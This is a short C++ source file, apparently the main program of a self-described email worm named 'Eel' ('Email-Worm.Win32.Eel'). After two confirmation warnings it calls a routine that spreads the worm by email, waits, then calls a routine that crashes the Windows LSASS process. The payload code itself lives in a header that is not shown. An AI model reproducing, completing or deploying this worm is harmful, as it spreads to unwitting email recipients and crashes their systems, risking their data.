/*
    Eel - by phasiawares
*/

#include "Eel.h"

int main(int argc, char* argv[])
{
		if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a piece of C++ code that can spread itself. Do you want to run this?", L"EEL", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\n\nThis is the final warning, This can actually put your data at risk! If you know the results while running Eel. Press Yes.\n\nProceed at your own risk...", L"Email-Worm.Win32.Eel - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		
		// Main payloads begin here.
		Payloads::SpreadEmail();
		
		Sleep(1000 * 60000);
		Payloads::CrashLSASS();
}
